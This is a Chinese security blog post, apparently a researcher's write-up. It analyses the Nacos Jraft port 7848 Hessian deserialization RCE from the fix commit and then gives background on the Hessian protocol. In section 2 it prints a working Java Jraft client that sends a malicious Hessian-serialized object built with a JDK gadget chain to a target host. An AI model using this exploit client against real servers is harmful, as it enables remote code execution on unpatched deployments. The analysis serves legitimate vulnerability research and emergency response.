

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/ico.png">
  <link rel="icon" href="/img/ico.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="pwnull">
  <meta name="keywords" content="">
  
    <meta name="description" content="1ã€èµ·æºä»æœ‹å‹åœˆäº†è§£åˆ°nacoså‡ºäº†ä¸ªæ´ï¼Œçœ‹èµ·æ¥æ˜¯rceè¿˜æŒºå”¬äººçš„ï¼Œå®¢æˆ·éƒ¨ç½²é‡ä¹Ÿæ¯”è¾ƒå¤šã€‚æœ¬ç€ä¸ºç”²æ–¹å®¢æˆ·çˆ¸çˆ¸è´Ÿè´£åˆ°åº•çš„åŸåˆ™ï¼Œå¯¹æ­¤æ¼æ´è¿›è¡Œäº†åº”æ€¥è¿½è¸ªã€‚æœ€åä¹Ÿæ ¹æ®å®˜æ–¹æ–‡æ¡£æˆåŠŸæ„é€ å¥½Jraftå®¢æˆ·ç«¯ä¸Hessianååºåˆ—åŒ–only jdk Gadgetçš„EXPã€‚ä»¥ä¸‹ç¬¬äºŒç« èŠ‚å†…å®¹ä¸ºå½“æ—¶è¿½è¸ªåˆ†æçš„ç¬”è®°ï¼Œæœªæä¾›expï¼Œä»…æŠ€æœ¯äº¤æµè®¨è®ºã€‚ç¬¬ä¸‰ç« èŠ‚æ˜¯Hessianååºåˆ—åŒ–ç›¸å…³çš„çŸ¥è¯†è¡¥å……ï¼Œåœ¨å®Œæˆäº†æ­¤æ¼æ´çš„åº”æ€¥åˆ†æåï¼Œå¯¹">
  
  
  
  <title>ä»Ali-Nacos-RCEæ¼æ´çœ‹RPC-Hessianåè®®å®‰å…¨ - è¿›é˜¶çš„èƒ–é—¹-pwnull</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"pwnull.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>è¿›é˜¶çš„èƒ–é—¹-pwnull</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                é¦–é¡µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                å½’æ¡£
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                åˆ†ç±»
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                æ ‡ç­¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                å…³äº
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="ä»Ali-Nacos-RCEæ¼æ´çœ‹RPC-Hessianåè®®å®‰å…¨"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-06-15 10:00" pubdate>
          2023-06-15
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          <!-- compatible with older versions-->
          26k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          221 åˆ†é’Ÿ
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ç›®å½•</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">ä»Ali-Nacos-RCEæ¼æ´çœ‹RPC-Hessianåè®®å®‰å…¨</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="1ã€èµ·æº"><a href="#1ã€èµ·æº" class="headerlink" title="1ã€èµ·æº"></a>1ã€èµ·æº</h2><p>ä»æœ‹å‹åœˆäº†è§£åˆ°nacoså‡ºäº†ä¸ªæ´ï¼Œçœ‹èµ·æ¥æ˜¯rceè¿˜æŒºå”¬äººçš„ï¼Œå®¢æˆ·éƒ¨ç½²é‡ä¹Ÿæ¯”è¾ƒå¤šã€‚æœ¬ç€ä¸ºç”²æ–¹å®¢æˆ·çˆ¸çˆ¸è´Ÿè´£åˆ°åº•çš„åŸåˆ™ï¼Œå¯¹æ­¤æ¼æ´è¿›è¡Œäº†åº”æ€¥è¿½è¸ªã€‚æœ€åä¹Ÿæ ¹æ®å®˜æ–¹æ–‡æ¡£æˆåŠŸæ„é€ å¥½Jraftå®¢æˆ·ç«¯ä¸Hessianååºåˆ—åŒ–only jdk Gadgetçš„EXPã€‚ä»¥ä¸‹ç¬¬äºŒç« èŠ‚å†…å®¹ä¸ºå½“æ—¶è¿½è¸ªåˆ†æçš„ç¬”è®°ï¼Œæœªæä¾›expï¼Œä»…æŠ€æœ¯äº¤æµè®¨è®ºã€‚ç¬¬ä¸‰ç« èŠ‚æ˜¯Hessianååºåˆ—åŒ–ç›¸å…³çš„çŸ¥è¯†è¡¥å……ï¼Œåœ¨å®Œæˆäº†æ­¤æ¼æ´çš„åº”æ€¥åˆ†æåï¼Œå¯¹æ•´ä¸ªè¿‡ç¨‹å¤ç›˜æ—¶å‘ç°è‡ªå·±å¯¹äºHessiançš„ç›¸å…³çŸ¥è¯†äº†è§£ä¸æ·±ï¼Œæƒ³ç€è¿‘äº›å¹´å¾®æœåŠ¡&#x2F;ä¸šåŠ¡ä¸Šäº‘ç­‰å¤§è¶‹åŠ¿æ¼”è¿›ï¼ŒRPCè¿œç¨‹é€šä¿¡æ¡†æ¶&#x2F;åè®®çš„å®‰å…¨é—®é¢˜ä¸€å®šä¼šæ˜¯æœªæ¥å®‰å…¨çš„é‡ç‚¹ã€‚ç´¢æ€§è¶ç€è¿™æ¬¡æœºä¼šè¶çƒ­æ‰“é“ï¼ŒæŠŠHessianåè®®çš„çŸ¥è¯†æ€»ç»“æ¶ˆåŒ–ä¸€æ³¢ã€‚ å¦‚æœå¯¹æ–‡ç« æœ‰ç–‘é—®&#x2F;å»ºè®®æˆ–è€…æƒ³ä¸€èµ·ç ”ç©¶äº¤æµçš„å¸ˆå‚…ï¼Œæ¬¢è¿ç§ä¿¡ğŸ˜œ</p>
<p><strong>PSï¼šæœ¬æ–‡ä»…ç”¨äºæŠ€æœ¯è®¨è®ºã€‚ä¸¥ç¦ç”¨äºä»»ä½•éæ³•ç”¨é€”ï¼Œè¿è€…åæœè‡ªè´Ÿï¼</strong></p>
<p>ç¬”è€…åœ¨ä¹‹å‰çš„å‡ ç¯‡æ–‡ç« ä¸­ï¼Œå¯¹rpcç›¸å…³çš„thriftã€rmiã€jmxç­‰åè®®çš„è¯¦ç»†åˆ†æ</p>
<p><a href="https://pwnull.github.io/2022/How-to-attack-RMI-based-JMX-services/">Attack JMX Serviceçš„æ‰“å¼€æ–¹å¼</a></p>
<p><a href="https://pwnull.github.io/2023/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/">VMware-vRealize-Log-Insight-thrift-RPCè°ƒç”¨RCE</a></p>
<p><a href="https://pwnull.github.io/2022/Exploring-JAVA-RMI's-offensive-and-defensive-history/">è®ºRMIçš„æ”»é˜²æ¼”è¿›å²</a></p>
<h2 id="2ã€è¡¥ä¸åˆ†æ"><a href="#2ã€è¡¥ä¸åˆ†æ" class="headerlink" title="2ã€è¡¥ä¸åˆ†æ"></a>2ã€è¡¥ä¸åˆ†æ</h2><p>Nacosæ˜¯ Dynamic Naming and Configuration Serviceçš„é¦–å­—æ¯ç®€ç§°ï¼Œæ˜¯é˜¿é‡Œæ¨å‡ºçš„ä¸€ä¸ªæ˜“äºæ„å»ºäº‘åŸç”Ÿåº”ç”¨çš„åŠ¨æ€æœåŠ¡å‘ç°ã€é…ç½®ç®¡ç†å’ŒæœåŠ¡ç®¡ç†å¹³å°ã€‚ Nacosæ„å»ºäº†ä»¥â€æœåŠ¡â€ä¸ºä¸­å¿ƒçš„ç°ä»£åº”ç”¨æ¶æ„ (ä¾‹å¦‚å¾®æœåŠ¡èŒƒå¼ã€äº‘åŸç”ŸèŒƒå¼) çš„æœåŠ¡åŸºç¡€è®¾æ–½ï¼Œå…¶åœ¨å„è¡Œå„ä¸šçš„åº”ç”¨æä¸ºæ™®éå¹¿æ³›ã€‚</p>
<p>åœ¨Nacosæ–°ç‰ˆæœ¬å‘å¸ƒè¯´æ˜æå–åˆ°å‡ ä¸ªå…³é”®è¯ï¼š Jraftè¯·æ±‚å¤„ç†ã€hessianååºåˆ—åŒ–æœªé™åˆ¶ã€RCEã€7848ç«¯å£  </p>
<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/releases">https://github.com/alibaba/nacos/releases</a></p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/1.png" srcset="/img/loading.gif" lazyload></p>
<p>æ£€ç´¢ä¸‹å®˜æ–¹æ–‡æ¡£å…³äºJraftè¯·æ±‚çš„ä¿¡æ¯   </p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/2.png" srcset="/img/loading.gif" lazyload></p>
<p>çœ‹åˆ° <a target="_blank" rel="noopener" href="https://nacos.io/zh-cn/docs/v2/upgrading/2.0.0-compatibility.html">https://nacos.io/zh-cn/docs/v2/upgrading/2.0.0-compatibility.html</a> Nacosé»˜è®¤å¼€å¯äº†7848ç«¯å£ï¼Œç”¨äºå¤„ç†æœåŠ¡ç«¯è§çš„Raftç›¸å…³è¯·æ±‚</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/3.png" srcset="/img/loading.gif" lazyload></p>
<p>ç»§ç»­çœ‹ä¸‹ä¿®å¤çš„commitï¼Œæ¶‰åŠäº†Hessianååºåˆ—åŒ–æ“ä½œã€‚æ·»åŠ äº†NacosHessianSerializerFactoryç™½åå•  <a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/pull/10542/commits">https://github.com/alibaba/nacos/pull/10542/commits</a></p>
<p>ä¸‹è½½å­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬nacos-server-2.2.2.zipï¼Œè§£å‹åå¯åŠ¨è¿è¡Œï¼š<code>startup.cmd -m standalone</code></p>
<p>åœ¨InstanceMetadataProcessorã€ServiceMetadataProcessorçš„ onApply æ–¹æ³•ä¸­è°ƒç”¨äº†serializer.deserializeï¼Œè€Œé»˜è®¤çš„serializerä¸ºHessianSerializer</p>
<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/pull/10542/commits/5804f5a46116dc1197bdd2c224d1368227b51232#diff-c8b875833c2f8a21ed873c9c1053b237ab04d4180caeea141e51c1932f665dae">https://github.com/alibaba/nacos/pull/10542/commits/5804f5a46116dc1197bdd2c224d1368227b51232#diff-c8b875833c2f8a21ed873c9c1053b237ab04d4180caeea141e51c1932f665dae</a></p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/4.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/5.png" srcset="/img/loading.gif" lazyload></p>
<p>è¿™é‡Œå°±æ˜¯Hessianååºåˆ—åŒ–çš„è§¦å‘ç‚¹ï¼Œnacoså®˜æ–¹å¯¹æ–¹æ³•com.alibaba.nacos.naming.core.v2.metadata.ServiceMetadataProcessor#onApplyå†™äº†æµ‹è¯•ç”¨ä¾‹ï¼šcom.alibaba.nacos.naming.core.v2.metadata.ServiceMetadataProcessorTest#testOnApplyï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­å¯ä»¥çœ‹åˆ°æ–¹æ³•å°†å®é™…åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–æ“ä½œçš„MetadataOperationå¯¹è±¡æ”¾å…¥WriteRequest#data_å‚æ•°ä¸­ã€å°†æ“ä½œæ ‡è¯†ADDæ”¾å…¥<code>operation_</code>å‚æ•°ä¸­</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/6.png" srcset="/img/loading.gif" lazyload></p>
<p>æ¥ç€æˆ‘ä»¬æ ¹æ®sofastackçš„jraftç”¨æˆ·æŒ‡å—ç¼–å†™Jraftå®¢æˆ·ç«¯å°†æ•°æ®å‘é€è‡³7848ç«¯å£çš„jraftæœåŠ¡ï¼Œ<a target="_blank" rel="noopener" href="https://www.sofastack.tech/projects/sofa-jraft/counter-example/">https://www.sofastack.tech/projects/sofa-jraft/counter-example/</a></p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/7.png" srcset="/img/loading.gif" lazyload></p>
<p>ç¢°åˆ°é”™è¯¯ï¼š<code>null default instance: com.alibaba.nacos.consistency.entity.WriteRequest</code></p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/8.png" srcset="/img/loading.gif" lazyload></p>
<p>ç»è¿‡è°ƒè¯•æ˜¯com.alipay.sofa.jraft.rpc.impl.GrpcClient#parserClassesä¸­æœªåŒ…å«com.alibaba.nacos.consistency.entity.WriteRequest</p>
<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/9.png" srcset="/img/loading.gif" lazyload></p>
<p>æ‰€ä»¥åœ¨è¿è¡Œexpå‰éœ€è¦å°†WriteRequestæ·»åŠ åˆ°parserClassesã€defaultMarshallerRegistry(marshalleræ–¹æ³•ä¼šç”¨åˆ°)å‚æ•°ä¸­ï¼Œæ‰¾åˆ°äº†com.alipay.sofa.jraft.rpc.impl.GrpcRaftRpcFactoryç±»ï¼Œå¯è°ƒç”¨registerProtobufSerializeræ–¹æ³•è¿›è¡Œæ·»åŠ </p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">WriteRequest writeRequest = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WriteRequest</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Builder()</span>.set<span class="hljs-constructor">Data(ByteString.<span class="hljs-params">copyFrom</span>(<span class="hljs-params">new</span> HessianSerializer()</span>.serialize(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Hessian_PKCS9Attributes_SwingLazyValue_JavaWrapper</span>.</span></span>get<span class="hljs-constructor">Object()</span>))).set<span class="hljs-constructor">Group(<span class="hljs-params">groupId</span>)</span>.set<span class="hljs-constructor">Operation(<span class="hljs-string">&quot;Write&quot;</span>)</span>.build<span class="hljs-literal">()</span>;<br><br><span class="hljs-comment">//parserClassesã€defaultMarshallerRegistryæ·»åŠ WriteRequest</span><br>GrpcRaftRpcFactory raftRpcFactory = (GrpcRaftRpcFactory) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RpcFactoryHelper</span>.</span></span>rpc<span class="hljs-constructor">Factory()</span>;<br>raftRpcFactory.register<span class="hljs-constructor">ProtobufSerializer(WriteRequest.<span class="hljs-params">class</span>.<span class="hljs-params">getName</span>()</span>,writeRequest);<br>MarshallerRegistry marshallerRegistry = raftRpcFactory.get<span class="hljs-constructor">MarshallerRegistry()</span>;<br>marshallerRegistry.register<span class="hljs-constructor">ResponseInstance(WriteRequest.<span class="hljs-params">class</span>.<span class="hljs-params">getName</span>()</span>, writeRequest);<br></code></pre></td></tr></table></figure>

<p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/10.png" srcset="/img/loading.gif" lazyload></p>
<p>æœ€ç»ˆæ„é€ å¥½çš„expï¼š</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">import com.alibaba.nacos.consistency.entity.WriteRequest;<br>import com.alibaba.nacos.consistency.serialize.HessianSerializer;<br>import com.alipay.sofa.jraft.RouteTable;<br>import com.alipay.sofa.jraft.conf.Configuration;<br>import com.alipay.sofa.jraft.entity.PeerId;<br>import com.alipay.sofa.jraft.option.CliOptions;<br>import com.alipay.sofa.jraft.rpc.impl.GrpcRaftRpcFactory;<br>import com.alipay.sofa.jraft.rpc.impl.MarshallerRegistry;<br>import com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;<br>import com.alipay.sofa.jraft.util.Endpoint;<br>import com.alipay.sofa.jraft.util.RpcFactoryHelper;<br>import com.google.protobuf.ByteString;<br><br>public <span class="hljs-keyword">class</span> JraftClient &#123;<br>    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;<br>        String groupId = <span class="hljs-string">&quot;naming_instance_metadata&quot;</span>;<br>        <span class="hljs-comment">// æ›´æ–°raft groupé…ç½®</span><br>        Configuration conf = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Configuration()</span>;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RouteTable</span>.</span></span>get<span class="hljs-constructor">Instance()</span>.update<span class="hljs-constructor">Configuration(<span class="hljs-params">groupId</span>, <span class="hljs-params">conf</span>)</span>;<br><br>        <span class="hljs-comment">//åˆ›å»ºClientService</span><br>        CliClientServiceImpl cliClientService = <span class="hljs-keyword">new</span> <span class="hljs-constructor">CliClientServiceImpl()</span>;<br>        CliOptions cliOptions = <span class="hljs-keyword">new</span> <span class="hljs-constructor">CliOptions()</span>;<br>        cliClientService.init(cliOptions);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RouteTable</span>.</span></span>get<span class="hljs-constructor">Instance()</span>.refresh<span class="hljs-constructor">Leader(<span class="hljs-params">cliClientService</span>, <span class="hljs-params">groupId</span>, 1000000)</span>;<br>        PeerId leader = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RouteTable</span>.</span></span>get<span class="hljs-constructor">Instance()</span>.select<span class="hljs-constructor">Leader(<span class="hljs-params">groupId</span>)</span>;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;Leader is &quot;</span> + leader);<br><br>        <span class="hljs-comment">//åˆ›å»ºwriteRequest</span><br>        WriteRequest writeRequest = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WriteRequest</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Builder()</span>.set<span class="hljs-constructor">Data(ByteString.<span class="hljs-params">copyFrom</span>(<span class="hljs-params">new</span> HessianSerializer()</span>.serialize(evilSerData))).set<span class="hljs-constructor">Group(<span class="hljs-params">groupId</span>)</span>.set<span class="hljs-constructor">Operation(<span class="hljs-string">&quot;Write&quot;</span>)</span>.build<span class="hljs-literal">()</span>;<br><br>        <span class="hljs-comment">//parserClassesã€defaultMarshallerRegistryæ·»åŠ WriteRequest</span><br>        GrpcRaftRpcFactory raftRpcFactory = (GrpcRaftRpcFactory) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RpcFactoryHelper</span>.</span></span>rpc<span class="hljs-constructor">Factory()</span>;<br>        raftRpcFactory.register<span class="hljs-constructor">ProtobufSerializer(WriteRequest.<span class="hljs-params">class</span>.<span class="hljs-params">getName</span>()</span>,writeRequest);<br>        MarshallerRegistry marshallerRegistry = raftRpcFactory.get<span class="hljs-constructor">MarshallerRegistry()</span>;<br>        marshallerRegistry.register<span class="hljs-constructor">ResponseInstance(WriteRequest.<span class="hljs-params">class</span>.<span class="hljs-params">getName</span>()</span>, writeRequest);<br><br>        <span class="hljs-comment">//å‘é€è¯·æ±‚</span><br>        cliClientService.get<span class="hljs-constructor">RpcClient()</span>.invoke<span class="hljs-constructor">Sync(<span class="hljs-params">new</span> Endpoint(<span class="hljs-string">&quot;host&quot;</span>, 7848)</span>, writeRequest, <span class="hljs-number">10000</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="3ã€Hessianååºåˆ—åŒ–"><a href="#3ã€Hessianååºåˆ—åŒ–" class="headerlink" title="3ã€Hessianååºåˆ—åŒ–"></a>3ã€Hessianååºåˆ—åŒ–</h2><p>å®¢æˆ·ç«¯æ„é€ å¥½äº†ï¼Œæ¥ç€å°±æ˜¯å»æ„é€ æ¶æ„çš„åºåˆ—åŒ–æ•°æ®ã€‚å…¶å®å°±æ˜¯æ‰¾Hessiané“¾ï¼Œæœ€å¼€å§‹ç”¨çš„æ˜¯ <a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a> ä¸­çš„SpringPartiallyComparableAdvisorHolderé“¾ï¼Œä½†æ˜¯éœ€è¦æ‰“jndiï¼Œè¿‡ç¨‹ä¸­ä¹Ÿç¢°åˆ°äº†æ„é€ æ•°æ®æ—¶æ„å¤–è§¦å‘toStringæ–¹æ³•å°±ä¼šç›´æ¥è§¦å‘rceçš„é—®é¢˜ï¼Œæ‰€ä»¥æœ€åç”¨äº†jdkåŸç”Ÿçš„PKCS9Attributeè§¦å‘bcelçš„ååºåˆ—åŒ–é“¾å®Œæˆäº†RCEï¼Œåœ¨å®Œæˆexpç¼–å†™åæƒ³ç€å¯¹Hessiançš„äº†è§£ä¸å¤šï¼Œç´¢æ€§å†èŠ±äº›æ—¶é—´æ•´ä½“çœ‹çœ‹Hessianååºåˆ—åŒ–çš„è¦ç‚¹ã€åˆ©ç”¨åŠå‘ç‚¹ï¼Œä¸‹æ¬¡å†ç¢°åˆ°ç±»ä¼¼é—®é¢˜å¯ä»¥å¿«é€Ÿè§£å†³ï¼Œæé«˜åˆ†ææ•ˆç‡ã€‚</p>
<h3 id="3-1-Hessianå†å²"><a href="#3-1-Hessianå†å²" class="headerlink" title="3.1 Hessianå†å²"></a>3.1 Hessianå†å²</h3><p>Hessianæ˜¯ä¸€ç§ç”¨äºè¿æ¥WEBå¾—ç®€å•äºŒè¿›åˆ¶åè®®ï¼Œç”±cauchoï¼ˆ<a target="_blank" rel="noopener" href="https://caucho.com/%EF%BC%89%E5%BC%80%E5%8F%91%EF%BC%8C%E4%BB%8E06%E5%B9%B4%E5%8F%91%E5%B8%833.0.20%E7%89%88%E6%9C%AC%E5%88%B019%E5%B9%B4%E5%8F%91%E5%B8%83%E7%9A%844.0.60%E7%89%88%E6%9C%AC%EF%BC%8C%E5%AE%9E%E9%99%85%E5%9C%A8maven%E4%BB%93%E5%BA%93%E4%B8%AD%E5%8F%AF%E4%BB%A5%E4%B8%8B%E8%BD%BD%E5%88%B0%E6%9C%80%E6%96%B0%E7%9A%844.0.66%E7%89%88%E6%9C%AC%EF%BC%9A">https://caucho.com/ï¼‰å¼€å‘ï¼Œä»06å¹´å‘å¸ƒ3.0.20ç‰ˆæœ¬åˆ°19å¹´å‘å¸ƒçš„4.0.60ç‰ˆæœ¬ï¼Œå®é™…åœ¨mavenä»“åº“ä¸­å¯ä»¥ä¸‹è½½åˆ°æœ€æ–°çš„4.0.66ç‰ˆæœ¬ï¼š</a> <a target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/com.caucho/hessian">https://mvnrepository.com/artifact/com.caucho/hessian</a></p>
<p>Hessianè™½ç„¶é»˜è®¤é›†æˆåœ¨resinä¸­ï¼Œä½†æ˜¯ä½¿ç”¨èµ·æ¥åªéœ€è¦com.caucho.hessian.clientã€com.caucho.hessian.serveråŒ…ï¼Œå¹¶ä¸éœ€è¦å…¶ä»–çš„Resinç±»ã€‚æ‰€ä»¥ä¹Ÿå¯ä»¥ç”¨äºè¾ƒå°çš„å®¢æˆ·ç«¯appletã€ç”¨äºæ‰‹æœº&#x2F;ç”µå­æ¸¸æˆæœºç­‰j2MEè®¾å¤‡è¿æ¥ResinæœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥ç”¨äºEJBæœåŠ¡ã€‚æ•´ä½“åˆ†ä¸ºHessian1ä¸Hessian2ä¸¤ä¸ªç‰ˆæœ¬ï¼Œåœ¨å®é™…ä½¿ç”¨ä¸­ä»¥åºåˆ—åŒ–æ•°æ®ä¸­çš„headerè¿›è¡ŒåŒºåˆ†ã€‚</p>
<p>Hessianç”±äºå…¶è·¨è¯­è¨€ã€å°å‹è½»é‡çº§ã€å¿«é€Ÿç´§å‡‘ï¼Œæ‰€ä»¥åœ¨RPCæ¡†æ¶åº”ç”¨ä¸­æä¸ºæµè¡Œã€‚</p>
